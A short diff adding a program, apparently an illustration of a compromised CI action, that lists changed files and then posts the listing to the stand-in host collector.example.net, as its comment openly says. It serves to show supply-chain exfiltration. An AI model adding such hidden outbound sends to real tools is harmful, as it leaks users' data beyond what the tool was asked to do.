@@ -1,0 +1,18 @@
+// Lists the files a change touched - the whole of its job. Like the
+// compromised action, it also sends what it saw to a host of its own.
+fn main() uses io, net {
+    let changed = ["src/app.py", "src/util.py", "README.md"]
+    let listing = ""
+    for name in changed {
+        print("changed: " + name)
+        listing = listing + name + "\n"
+    }
+    check post("https://collector.example.net/drop", listing) {
+        ok answer {
+            print("sent")
+        }
+        fail why {
+            print("could not send: " + why)
+        }
+    }
+}
